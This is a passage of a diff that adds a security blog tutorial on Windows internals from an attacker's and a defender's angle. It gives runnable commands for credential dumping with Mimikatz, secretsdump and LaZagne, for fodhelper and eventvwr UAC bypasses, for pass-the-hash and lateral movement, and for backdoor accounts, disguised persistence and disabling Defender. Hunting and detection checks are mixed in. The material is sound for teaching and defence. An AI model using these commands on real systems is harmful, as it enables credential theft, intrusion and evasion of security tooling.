+Get-Content C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue
+Get-Content C:\Windows\System32\sysprep\Unattend.xml -ErrorAction SilentlyContinue
+Get-Content C:\Windows\sysprep.inf -ErrorAction SilentlyContinue
+
+# PuTTY saved sessions
+reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions /s
+
+# WinSCP stored credentials
+reg query HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions /s
+
+# FileZilla stored credentials
+Get-Content &#34;$env:APPDATA\FileZilla\recentservers.xml&#34; -ErrorAction SilentlyContinue
+Get-Content &#34;$env:APPDATA\FileZilla\sitemanager.xml&#34; -ErrorAction SilentlyContinue
+
+# Mimikatz (requires admin / SYSTEM + SeDebugPrivilege)
+# Run as admin:
+mimikatz.exe
+# Inside mimikatz:
+privilege::debug
+sekurlsa::logonpasswords    # dump lsass — hashes and plaintext
+sekurlsa::tickets           # Kerberos tickets
+lsadump::sam                # SAM hashes
+lsadump::dcsync /user:Administrator  # DCSync (from DC or with rights)
+
+# Remote SAM dump (if admin on remote host)
+impacket-secretsdump Administrator:password@10.10.10.5
+
+# DCSync from Linux (requires DCs&#39; replication rights)
+impacket-secretsdump -just-dc corp.local/alice:password@10.10.10.100
+
+# LaZagne — automated credential harvesting
+laZagne.exe all
+laZagne.exe browsers
+laZagne.exe windows</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">13</span>
+            <span class="heading-text">UAC &amp; Bypass Techniques</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>UAC (User Account Control)</strong> prompts for elevation when an admin-level operation is requested — even for Administrators. It's a consent mechanism, not a security boundary, but it prevents silent privilege escalation.</p>
+<p><strong>UAC levels:</strong><br>
+- <strong>Always notify</strong> — prompt for everything<br>
+- <strong>Default</strong> — prompt only for app changes, not Windows settings<br>
+- <strong>Notify only when apps make changes (no secure desktop)</strong> — same but no dimming<br>
+- <strong>Never notify</strong> — UAC off</p>
+<p><strong>Token split</strong> — when an admin logs in with UAC enabled, they get two tokens: a standard user token for normal work and a high-integrity admin token for elevated operations. Most processes run with the standard token.</p>
+<p><strong>Integrity levels:</strong> Every process and object has an integrity level. Standard user = Medium. Elevated = High. SYSTEM = System. UAC is essentially a Medium → High transition.</p>
+<p><strong>UAC bypass</strong> — techniques that elevate from Medium to High without a UAC prompt, by abusing auto-elevating processes, COM object hijacking, or DLL injection into high-integrity processes. Well-known examples: <code>fodhelper.exe</code>, <code>eventvwr.exe</code>, <code>sdclt.exe</code> registry hijacks.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">UAC check and common bypasses</span>
+          </div>
+          <pre><code class="language-powershell"># Check current integrity level
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups |
+    Where { $_.Value -eq &#39;S-1-16-12288&#39; } | Select Value  # S-1-16-12288 = High
+
+# Or with whoami
+whoami /groups | findstr Level
+
+# Check UAC setting
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+
+# ── fodhelper UAC bypass ─────────────────────────────────────────────────────
+# fodhelper.exe auto-elevates and reads shell\open\command from HKCU (user-writable)
+New-Item &#34;HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command&#34; -Force
+New-ItemProperty &#34;HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command&#34; `
+    -Name DelegateExecute -Value &#34;&#34; -Force
+Set-ItemProperty &#34;HKCU:\SOFTWARE\Classes\ms-settings\shell\open\command&#34; `
+    -Name &#34;(default)&#34; -Value &#34;C:\temp\payload.exe&#34; -Force
+Start-Process &#34;C:\Windows\System32\fodhelper.exe&#34;
+# Clean up
+Remove-Item &#34;HKCU:\SOFTWARE\Classes\ms-settings\&#34; -Recurse -Force
+
+# ── eventvwr UAC bypass ──────────────────────────────────────────────────────
+New-Item &#34;HKCU:\SOFTWARE\Classes\mscfile\shell\open\command&#34; -Force
+Set-ItemProperty &#34;HKCU:\SOFTWARE\Classes\mscfile\shell\open\command&#34; `
+    -Name &#34;(default)&#34; -Value &#34;C:\temp\payload.exe&#34; -Force
+Start-Process &#34;C:\Windows\System32\eventvwr.exe&#34;
+
+# ── UACME / automated bypass tools ──────────────────────────────────────────
+.\UACME\Akagi64.exe 23 C:\temp\payload.exe   # method 23 = fodhelper
+
+# ── Check UAC bypass mitigations ─────────────────────────────────────────────
+# EnableVirtualization = 1 means registry/file virtualisation is active
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableVirtualization</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">14</span>
+            <span class="heading-text">Lateral Movement</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Once you have credentials or a session on one machine, lateral movement is how you reach other targets in the network.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Technique</th><th>Protocol/Port</th><th>Tool</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**Pass-the-Hash**</td><td>SMB 445 / WinRM 5985</td><td>Mimikatz, CrackMapExec, Impacket</td>
+                </tr>
+              
+                <tr>
+                  <td>**Pass-the-Ticket**</td><td>Kerberos 88</td><td>Rubeus, Mimikatz</td>
+                </tr>
+              
+                <tr>
+                  <td>**Over-Pass-the-Hash** (Pass-the-Key)</td><td>Kerberos</td><td>Mimikatz, Rubeus</td>
+                </tr>
+              
+                <tr>
+                  <td>**PsExec**</td><td>SMB 445</td><td>Impacket psexec.py, Sysinternals</td>
+                </tr>
+              
+                <tr>
+                  <td>**WinRM / Evil-WinRM**</td><td>5985 / 5986</td><td>Evil-WinRM, Enter-PSSession</td>
+                </tr>
+              
+                <tr>
+                  <td>**RDP**</td><td>3389</td><td>xfreerdp, rdesktop, mstsc</td>
+                </tr>
+              
+                <tr>
+                  <td>**WMI**</td><td>DCOM 135</td><td>Impacket wmiexec.py, Invoke-WmiMethod</td>
+                </tr>
+              
+                <tr>
+                  <td>**SCM (sc.exe)**</td><td>SMB 445</td><td>sc.exe, smbexec</td>
+                </tr>
+              
+                <tr>
+                  <td>**DCOM**</td><td>DCOM 135</td><td>DCOM lateral movement via MMC20 etc.</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            <span class="code-caption">Lateral movement techniques</span>
+          </div>
+          <pre><code class="language-bash"># ── CrackMapExec (CME) — Swiss army knife for AD ────────────────────────────
+# Password spray across a subnet
+crackmapexec smb 10.10.10.0/24 -u alice -p &#39;Password1!&#39;
+
+# Pass-the-hash
+crackmapexec smb 10.10.10.5 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+# Execute command
+crackmapexec smb 10.10.10.5 -u alice -p &#39;Password1!&#39; -x &#34;whoami&#34;
+crackmapexec winrm 10.10.10.5 -u alice -p &#39;Password1!&#39; -x &#34;whoami&#34;
+
+# Dump SAM
+crackmapexec smb 10.10.10.5 -u Administrator -p &#39;Password1!&#39; --sam
+
+# ── Impacket suite ───────────────────────────────────────────────────────────
+# PsExec-style (interactive SYSTEM shell)
+impacket-psexec Administrator:Password1!@10.10.10.5
+impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.5
+
+# WMI exec
+impacket-wmiexec Administrator:Password1!@10.10.10.5 &#34;whoami&#34;
+
+# SMBexec (noisier, different artefacts)
+impacket-smbexec Administrator:Password1!@10.10.10.5
+
+# ── Evil-WinRM ───────────────────────────────────────────────────────────────
+evil-winrm -i 10.10.10.5 -u alice -p &#39;Password1!&#39;
+evil-winrm -i 10.10.10.5 -u alice -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+# ── RDP ──────────────────────────────────────────────────────────────────────
+xfreerdp /u:alice /p:&#39;Password1!&#39; /v:10.10.10.5
+xfreerdp /u:alice /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.10.10.5  # pth RDP
+
+# Enable RDP (if you have admin)
+reg add &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall add rule name=&#34;RDP&#34; protocol=TCP dir=in localport=3389 action=allow
+
+# ── WinRM from PowerShell ────────────────────────────────────────────────────
+$cred = Get-Credential
+Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred
+Invoke-Command -ComputerName 10.10.10.5 -Credential $cred -ScriptBlock { whoami; hostname }</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">15</span>
+            <span class="heading-text">Persistence Mechanisms</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Persistence ensures access survives reboots, logoffs, and credential changes.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Mechanism</th><th>Location</th><th>Detection</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>Registry Run keys</td><td>`HKCU/HKLM\...\Run`</td><td>Autoruns, reg query</td>
+                </tr>
+              
+                <tr>
+                  <td>Scheduled tasks</td><td>`schtasks`, Task Scheduler</td><td>schtasks /query</td>
+                </tr>
+              
+                <tr>
+                  <td>Services</td><td>SCM, registry</td><td>sc query, Autoruns</td>
+                </tr>
+              
+                <tr>
+                  <td>Startup folder</td><td>`C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`</td><td>dir, Autoruns</td>
+                </tr>
+              
+                <tr>
+                  <td>DLL hijacking</td><td>Writable directory in DLL search path</td><td>Procmon, Autoruns</td>
+                </tr>
+              
+                <tr>
+                  <td>COM object hijacking</td><td>`HKCU\SOFTWARE\Classes\CLSID`</td><td>Autoruns</td>
+                </tr>
+              
+                <tr>
+                  <td>WMI subscriptions</td><td>WMI permanent event subscriptions</td><td>Get-WMIObject, Autoruns</td>
+                </tr>
+              
+                <tr>
+                  <td>Boot/logon scripts</td><td>GPO, logon script settings</td><td>GPO review</td>
+                </tr>
+              
+                <tr>
+                  <td>Golden/Silver tickets</td><td>Kerberos</td><td>Detect anomalous tickets (SIEM)</td>
+                </tr>
+              
+                <tr>
+                  <td>SSH authorized_keys (WSL)</td><td>If WSL installed</td><td>Check WSL home dirs</td>
+                </tr>
+              
+                <tr>
+                  <td>Account backdoor</td><td>Add user to Administrators</td><td>net localgroup, event 4732</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Persistence and detection</span>
+          </div>
+          <pre><code class="language-powershell"># ── Create persistence ───────────────────────────────────────────────────────
+# Registry Run key
+Set-ItemProperty &#34;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34; `
+    -Name &#34;WindowsUpdate&#34; -Value &#34;C:\temp\payload.exe&#34;
+
+# Startup folder (no admin needed for current user)
+Copy-Item C:\temp\payload.exe `
+    &#34;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe&#34;
+
+# New local admin account (if you have privs)
+net user backdoor P@ssw0rd! /add
+net localgroup Administrators backdoor /add
+net user backdoor /active:yes
+
+# WMI event subscription (stealthy, survives reboots)
+$filter = ([wmiclass]&#34;\\\\localhost\\root\\subscription:__EventFilter&#34;).CreateInstance()
+$filter.Name = &#34;WindowsUpdate&#34;
+$filter.QueryLanguage = &#34;WQL&#34;
+$filter.Query = &#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfRawData_PerfOS_System&#39;&#34;
+$filter.Put()
+
+# ── Hunt for persistence ─────────────────────────────────────────────────────
+# Autoruns (Sysinternals) — the gold standard
+autorunsc.exe -a * -user * -c -h -vt | Export-Csv autoruns.csv
+
+# Manual checks
+reg query &#34;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+reg query &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&#34;
+reg query &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&#34;
+
+Get-ScheduledTask | Where State -ne Disabled | Select TaskName, TaskPath
+
+Get-CimInstance Win32_Service | Where StartMode -eq &#39;Auto&#39; | 
+    Select Name, PathName, StartName
+
+Get-ChildItem &#34;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup&#34;
+Get-ChildItem &#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;
+
+# WMI subscriptions
+Get-WMIObject -Namespace root\subscription -Class __EventFilter
+Get-WMIObject -Namespace root\subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">16</span>
+            <span class="heading-text">Sysinternals &amp; Defender Tools</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <strong>Sysinternals Suite</strong> (now Microsoft) provides tools that go far beyond what's built into Windows. Essential for both attackers and defenders.</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Tool</th><th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>**Process Explorer**</td><td>Detailed process tree, DLLs, handles, VirusTotal</td>
+                </tr>
+              
+                <tr>
+                  <td>**Process Monitor (Procmon)**</td><td>Real-time file, registry, network, process events</td>
+                </tr>
+              
+                <tr>
+                  <td>**Autoruns**</td><td>Everything that auto-starts — registry, tasks, services, drivers</td>
+                </tr>
+              
+                <tr>
+                  <td>**PsExec**</td><td>Remote execution via SMB</td>
+                </tr>
+              
+                <tr>
+                  <td>**PsLoggedOn**</td><td>Who is logged into a machine</td>
+                </tr>
+              
+                <tr>
+                  <td>**TCPView**</td><td>Live network connection view with process names</td>
+                </tr>
+              
+                <tr>
+                  <td>**AccessChk**</td><td>Check permissions on files, registry, services</td>
+                </tr>
+              
+                <tr>
+                  <td>**Sysmon**</td><td>Extended audit logging — process creation, network, registry</td>
+                </tr>
+              
+                <tr>
+                  <td>**Strings**</td><td>Extract printable strings from binaries</td>
+                </tr>
+              
+                <tr>
+                  <td>**Sigcheck**</td><td>Verify code signing, VirusTotal lookup</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Windows Defender / Microsoft Defender for Endpoint (MDE)</strong><br>
+- Built-in AV + EDR on modern Windows<br>
+- <strong>AMSI</strong> (Antimalware Scan Interface) — hooks into PowerShell, JScript, VBScript to scan content at runtime<br>
+- <strong>Controlled Folder Access</strong> — blocks ransomware by preventing writes to protected folders<br>
+- <strong>Attack Surface Reduction (ASR) Rules</strong> — block specific behaviours (Office macros calling cmd, PSExec, credential dumping)</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">powershell</span>
+            <span class="code-caption">Defender status and evasion awareness</span>
+          </div>
+          <pre><code class="language-powershell"># Check Defender status
+Get-MpComputerStatus
+Get-MpComputerStatus | Select AMRunningMode, RealTimeProtectionEnabled, 
+    AntivirusSignatureLastUpdated, AMProductVersion
+
+# Defender exclusions (may reveal unmonitored paths)
+Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension
+
+# Disable Defender (requires admin, and Tamper Protection must be off)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Add exclusion (common attacker move after getting admin)
+Add-MpPreference -ExclusionPath &#34;C:\temp&#34;
+Add-MpPreference -ExclusionExtension &#34;.exe&#34;
+
+# Check ASR rules
+Get-MpPreference | Select AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions
+
+# AMSI bypass awareness — what defenders look for:
+# amsiInitFailed patching, memory patching amsi.dll, reflection to set AmsiContext
+# Modern defenders alert on script blocks containing AMSI bypass patterns
+
+# Sysmon — check if installed
+Get-Service Sysmon -ErrorAction SilentlyContinue
+Get-Process sysmon -ErrorAction SilentlyContinue
+
+# Sysmon config
+sysmon -c           # print current config
+
+# Check logging policy
+auditpol /get /category:*
+# Specifically:
+auditpol /get /subcategory:&#34;Process Creation&#34;    # should be Success,Failure
+auditpol /get /subcategory:&#34;Logon&#34;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">17</span>
+            <span class="heading-text">Key Takeaways</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Concepts to have cold:</strong></p>
+<ul>
+<li><code>lsass.exe</code> is the credential goldmine — it holds hashes and tickets for every logged-in user. Getting SYSTEM and dumping lsass is the backbone of Windows credential theft.</li>
+<li>The SAM database stores local hashes; NTDS.dit stores all domain hashes. Both are locked at runtime — you need VSS, reg save, or DCSync.</li>
+<li>NTLM hashes are pass-the-hash-able. You don't need to crack them to use them.</li>
+<li><code>SeImpersonatePrivilege</code> on a service account → Potato attack → SYSTEM. This is reliably true on unpatched or default configs.</li>
+<li>Registry Run keys, scheduled tasks, and services are the three main persistence locations. Check all three when hunting implants.</li>
+<li>Kerberoasting: any domain user can request a service ticket for any SPN. Hash goes offline for cracking. No logs until cracking succeeds.</li>
+<li>Always run <code>whoami /all</code> on every new Windows shell — privileges and groups tell you the entire escalation story at a glance.</li>
+<li>UAC is not a security boundary. It's a speedbump against accidental elevation. Medium-integrity admin account + known bypass = High integrity in seconds.</li>
+<li>PowerShell Script Block Logging (event 4104) records everything. Assume your commands are being logged. Understand what defenders see.</li>
+<li>BloodHound maps the entire AD graph visually — run SharpHound, import, and follow the attack paths. It finds privilege escalation routes through ACL chains that no manual enumeration would find.</li>
+</ul>
+<p><strong>Tools to know:</strong><br>
+<code>nmap</code>, <code>crackmapexec</code>, <code>impacket</code>, <code>evil-winrm</code>, <code>mimikatz</code>, <code>rubeus</code>, <code>bloodhound/sharphound</code>, <code>powerup</code>, <code>winpeas</code>, <code>sysmon</code>, <code>autoruns</code>, <code>procmon</code></p>
+<p>Windows enterprise environments are complex by design — that complexity creates attack surface. Every feature (delegation, WMI, COM, DFS, RPC) is also a potential vector. The deeper your understanding of how Windows actually works, the faster you move on every engagement.</p></div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/linux-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Linux Fundamentals — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Filesystem, permissions, users, processes, services, networking, bash, cron, logs, and a red team lens on every concept that matters in practice.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/active-directory-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Active Directory — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Domain architecture, authentication protocols, objects, Group Policy, trusts, delegation, and a full red team playbook from initial foothold to domain dominance.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/ad-privilege-escalation-user-to-da" class="post-card post-card-related card-cat-security">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-security">Security</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Active Directory Privilege Escalation — From User to Domain Admin</h2>
+          <div class="post-card-meta"><time>2026-06-17</time></div>
+          <p class="post-card-summary">A structured walkthrough of the most common path from a single standard domain account to Domain Admin: Kerberoasting, AS-REP roasting, ACL abuse, and the three delegation attacks. Every step paired with the detection and hardening that closes it.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
